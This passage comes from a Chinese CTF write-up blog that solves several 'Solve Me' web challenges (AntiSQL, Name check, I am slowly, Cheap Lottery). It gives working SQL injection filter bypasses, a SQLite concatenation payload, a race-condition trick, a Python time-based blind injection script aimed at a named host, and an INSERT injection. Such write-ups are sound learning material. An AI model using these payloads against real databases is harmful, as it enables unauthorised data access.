class="string">"125"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"98"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span></span><br><span class="line">]</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dit:</span><br><span class="line">s = s + chr(int(i))</span><br></pre></td></tr></table></figure><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// good job!</span><br><span class="line"></span><br><span class="line">let flag = prompt(&quot;what is the flag?&quot;);</span><br><span class="line"></span><br><span class="line">if (flag === &quot;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;plnput&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else if (flag === &quot;flag&#123;21df4ad3ce31af845cf9cd6a5eddbb91&#125;&quot;) &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;bingo&quot;);</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">alert(&quot;wrong&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="AntiSQL"><a href="#AntiSQL" class="headerlink" title="AntiSQL"></a>AntiSQL</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'Anti SQLi' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $pw = $_GET[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            <span class="string">'/\.|\`|"|\'|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|'</span>.</span><br><span class="line">            <span class="string">'=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|'</span>.</span><br><span class="line">            <span class="string">'0x[0-9a-f]+|0b[01]+|x\'[0-9a-f]+\'|b\'[01]+\'|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0\'"]+(as|or|and|r*like|regexp)[\s\xA0\'"]+|'</span>.</span><br><span class="line">            <span class="string">'union[\s\xA0]+select|[\s\xA0](where|having)|'</span>.</span><br><span class="line">            <span class="string">'[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|'</span>.</span><br><span class="line">            <span class="string">'information_schema|procedure\s+analyse\s*/is'</span>,</span><br><span class="line">            $id.<span class="string">','</span>.$pw</span><br><span class="line">        ) <span class="keyword">and</span> <span class="keyword">die</span>(<span class="string">'Hack detected'</span>);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                <span class="string">"SELECT * FROM `antisqli` WHERE `id`='&#123;$id&#125;' AND `pw`=md5('&#123;$pw&#125;');"</span></span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            <span class="keyword">if</span>($result[<span class="string">'no'</span>] === <span class="string">'31337'</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $flag;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'Hello, '</span>, $result[<span class="string">'id'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>简单说一下这段代码的意思，就是传进两个参数，然后进行过滤，然后进行数据库的查找，查找的结果里面如果含有<code>31337</code>的就可以成功输出flag了</p><p>这段代码里面有一个很吓唬人的过滤准则，但是其实里面存在小漏洞<br>    首先过滤了单引号啥的，注入一个单引号行不通，但是我们可以去掉一个单引号，如果要正则匹配\的话，正确的写法应该是 <code>|\\\\|</code>也就是说，反斜杠没有被过滤。这样我们可以注入反斜杠把id的第二个单引号给搞掉。这样一来就可以注入了<br>第二点就是他那个<code>union[\s\xA0]+select</code>把所有非空字符都过滤掉了，所以说直接上<code>union select</code>是不太行的,但是我们可以用<code>union all select</code>去绕过<br>然后是注释的问题，因为正则里面明确把<code>#</code>，还有<code>--加上空字符</code>过滤掉了，那我们用<code>--%1a</code>注释也是可以的<br>还有因为这里<code>order by</code> 也过滤了，只能手动去测试列数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>发现回显的是Login failed说明列数不对，再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>还是login failed,再继续试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 1,2,3 from antisqli --%1A</span><br></pre></td></tr></table></figure><p>这时候回显Hello了，代码逻辑跳到第一个if条件里面，说明有3列<br>然后我们直接上payload<br><code>?id=\&amp;pw=union all select 31337,2,3 from antisqli --%1A</code> 直接出flag<br>这里的语句在数据库里大概是这样的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`antisqli`</span> <span class="keyword">WHERE</span> <span class="string">`id`</span>=<span class="string">' \' and `pw` = md5('</span> <span class="keyword">union</span> all <span class="keyword">select</span> .... <span class="keyword">from</span> ... <span class="comment">--%1a</span></span><br></pre></td></tr></table></figure><p>重点是union all前面的语句为空，直接执行后面的语句，这太灵活了，又学到了</p><h3 id="Name-check"><a href="#Name-check" class="headerlink" title="Name check"></a>Name check</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   error_reporting(<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">       $name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">"/admin|--|;|\(\)|\/\*|\\0/i"</span>, $name))&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Not allowed input'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $sql = <span class="keyword">new</span> SQLite3(<span class="string">'name_check.db'</span>, SQLITE3_OPEN_READWRITE);</span><br><span class="line">       $res = $sql-&gt;query(<span class="string">"</span></span><br><span class="line"><span class="string">           SELECT </span></span><br><span class="line"><span class="string">           MAX('0','1','&#123;$name&#125;') LIKE 'a%', </span></span><br><span class="line"><span class="string">           INSTR('&#123;$name&#125;','d')&gt;0, </span></span><br><span class="line"><span class="string">           MIN('&#123;$name&#125;','b','c') LIKE '__m__', </span></span><br><span class="line"><span class="string">           SUBSTR('&#123;$name&#125;',-2)='in'</span></span><br><span class="line"><span class="string">       ;"</span>);</span><br><span class="line">       <span class="keyword">if</span>($res === <span class="keyword">false</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Database error'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">       <span class="keyword">if</span>(</span><br><span class="line">           $row[<span class="number">0</span>] + $row[<span class="number">1</span>] + $row[<span class="number">2</span>] + $row[<span class="number">3</span>] !== <span class="number">4</span> ||</span><br><span class="line">           array_sum($row) !== <span class="number">4</span> </span><br><span class="line">       )&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'Auth failed'</span>;</span><br><span class="line">           <span class="keyword">goto</span> quit;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br><span class="line">   quit:</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>我没玩过sqlite，但是感觉这里一定要满足admin这个东西，因为query函数后面的东西，但是这里的过滤是正整一个词的过滤，但是我们可以用sqlite的连接词<code>||</code>去实现绕过，但是对于mysql字符串的拼接只能用<code>concat</code>函数去拼接<br>所以最后的payload：<code>ad&#39;||&#39;min</code></p><h3 id="I-am-slowly"><a href="#I-am-slowly" class="headerlink" title="I am slowly"></a>I am slowly</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// It's 'I am slowly' problem of 'Solve Me'.</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>; </span><br><span class="line"></span><br><span class="line">    $table = <span class="string">'iamslowly_'</span>.ip2long($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    $answer = $_GET[<span class="string">'answer'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL server down'</span>);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT `count` FROM `&#123;$table&#125;`;"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($result))&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);"</span>);</span><br><span class="line">            $new_answer = md5(sha1(<span class="string">'iamslowly_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand().<span class="string">'_'</span>.mt_rand()));</span><br><span class="line">            mysqli_query($con, <span class="string">"INSERT INTO `&#123;$table&#125;` (`answer`,`count`) VALUES ('&#123;$new_answer&#125;',1);"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">elseif</span>($result[<span class="string">'count'</span>] === <span class="string">'12'</span>)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Game over'</span>;</span><br><span class="line">            <span class="keyword">goto</span> quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $randtime = mt_rand(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, <span class="string">"SELECT * FROM `&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';"</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($result) &amp;&amp; $result[<span class="string">'answer'</span>] === $answer)&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"DROP TABLE `&#123;$table&#125;`;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            mysqli_query($con, <span class="string">"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Go fast'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">quit:</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个题目也是很骚，我第一次遇见这一种类型的题目，利用来了php以及mysql之间的延时关系去绕过那一个可恶的12.。。<br>但是执行过程过于缓慢啊，主要是两个延时太过耗时<br>概述一下这题目的意思传参进去之后，如果没有对应的表就根据你的ip创建一个表，并且这个表里面含有一个名为COUNT的字段，初始值为1，后面就一直往这里面的COUNT+1，如果到12的话就会把表删掉重新再新建一个表，所以关键是他的逻辑顺序出了错误。</p><p><code>判断count的值–&gt;执行SQL语句–&gt;加count值</code></p><p>这个逻辑在执行语句的时候有问题，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 执行SQL语句 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer，这确实骚气<br>小脚本，最好还是把header啥的都弄进去，毕竟是靠ip建表的，这个东西跑得很慢不值得，而且一直都跑的错的答案，QAQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">keys = <span class="string">'0123456789abcdef'</span></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">"Host"</span>: <span class="string">"iamslowly.thinkout.rf.gd"</span>,</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0"</span>,</span><br><span class="line">     <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">     <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">      <span class="string">"Accept-Encoding"</span>:<span class="string">"gzip, deflate"</span>,</span><br><span class="line">      <span class="string">"Referer"</span>: <span class="string">"http://iamslowly.thinkout.rf.gd/"</span>,</span><br><span class="line"><span class="string">"Cookie"</span>: <span class="string">"__test=4e8126e93f7b5a4448c7e3c1f0b7853e"</span>,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>:<span class="string">"1"</span>,</span><br><span class="line">      <span class="string">"Cache-Control"</span>: <span class="string">"max-age=0"</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line">        url = <span class="string">"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(30),2)%23"</span>.format(payload + j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            content = requests.get(url,headers=header,timeout=<span class="number">29</span>).content</span><br><span class="line">            <span class="comment">#print(content[:10])</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'[+]Waiting!'</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Cheap-Lottery"><a href="#Cheap-Lottery" class="headerlink" title="Cheap Lottery"></a>Cheap Lottery</h3><p>这个题目一开始用扫描器扫一下发现里面存在robots.txt打开发现</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /backup/</span><br></pre></td></tr></table></figure><p>进去backup发现几个文件</p><p>一个数据库文件，还有一份源码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span> (</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`time`</span> <span class="built_in">int</span>(<span class="number">4</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`nums`</span> <span class="built_in">char</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`lottery`</span></span><br><span class="line">  <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`name`</span> (<span class="string">`name`</span>);</span><br></pre></td></tr></table></figure><p>作为菜鸟感觉是SQL注入，但无从下手，知道发现原来方方土学长早就写过这题的题解<a href="https://www.anquanke.com/post/id/101939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/101939</a><br>这波骚操作还是6，运用了字符集去绕过</p><p>而且p神也发过类似的文章(tql,QAQ)<br><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html</a></p><p>先讲一下这一段代码的意思，发现骆骆大佬早就做过这题而且流程图都画好了，我就直接贴图吧。。简单粗暴<br><img src="https://s1.ax1x.com/2018/04/03/CpBkLt.png" alt="这里写图片描述"></p><p>我们要利用的点就是这一段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$nums = preg_replace(<span class="string">"/[a-zA-Z\[\]\=]/"</span>, <span class="string">""</span>, $url_query);</span><br><span class="line">$nums = strtr($nums, <span class="string">"&amp;"</span>, <span class="string">","</span>);</span><br><span class="line">$sql-&gt;query(<span class="string">"INSERT INTO `lottery`(`name`, `time`, `nums`) VALUE('&#123;$name&#125;', '&#123;$time&#125;', '&#123;$nums&#125;');"</span>);</span><br></pre></td></tr></table></figure><p>这段代码往数据库里面添加数据，只要我们往里面添加自己规定的值，然后再在另一处以同一ip地址进行访问(不购买)不就可以直接进到check模块了。。<br>意思就是这样<br>开始数据库里面是这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69,69,69,69,69'</span>);</span><br></pre></td></tr></table></figure><p>后来我们构造，使数据库一开始就存在这样的值，我们下一次访问的时候就名正言顺的是买正确了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `lotter` (`name`,`time`,`nums`) VALUES (<span class="string">'guest_1.1.1.1'</span>,<span class="string">'time()'</span>,<span class="string">'69'</span>),(<span class="string">'admin1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>),(<span class="string">'guest_1.1.1.1'</span>,<span class="string">'$time'</span>,<span class="string">'69,69,69,69,69'</span>)<span class="comment">#',69,69,69,69');</span></span><br></pre></td></tr></table></figure><p>就可以名正言顺地使<code>bingo</code>这个值等于5，然后就输出flag了，也就是进入下面这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$bingo = <span class="number">0</span>;</span><br><span class="line">$nums_admin = explode(<span class="string">","</span>, $row_admin[<span class="string">'nums'</span>]); <span class="comment">// admin_*</span></span><br><span class="line">$nums_guest = explode(<span class="string">","</span>, $row_guest[<span class="string">'nums'</span>]); <span class="comment">// guest_*</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">5</span>; ++$i)&#123;</span><br><span class="line"><span class="keyword">for</span>($k = <span class="number">0</span>; $k &lt; <span class="number">5</span>; ++$k)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($nums_admin[$i], $nums_guest[$k]) &amp;&amp; $nums_admin[$i] === $nums_guest[$k])&#123;</span><br><span class="line">++$bingo;</span><br><span class="line"><span class="keyword">unset</span>($nums_guest[$k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unset</span>($nums_admin, $nums_guest);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($bingo == <span class="number">5</span>)&#123; <span class="comment">// correct all</span></span><br><span class="line">$msg = <span class="string">"Perfect! The flag is &lt;code&gt;&#123;$flag&#125;&lt;/code&gt;."</span>;</span><br></pre></td></tr></table></figure><p>但是我们要网关键的代码注入自己想要的东西，就必须得绕过字母这个步骤，这里开始及牵涉到字符集的问题了。</p><p>总结一下那几篇博客看到的点<br>MySQL中的字符集转换过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；</span><br><span class="line">2. 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，其确定方法如下：</span><br><span class="line">使用每个数据字段的CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用对应数据表的DEFAULT CHARACTER SET设定值(MySQL扩展，非SQL标准)；</span><br><span class="line">• 若上述值不存在，则使用对应数据库的DEFAULT CHARACTER SET设定值；</span><br><span class="line">• 若上述值不存在，则使用character_set_server设定值。</span><br><span class="line">3. 将操作结果从内部操作字符集转换为character_set_results</span><br></pre></td></tr></table></figure></p><p>也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 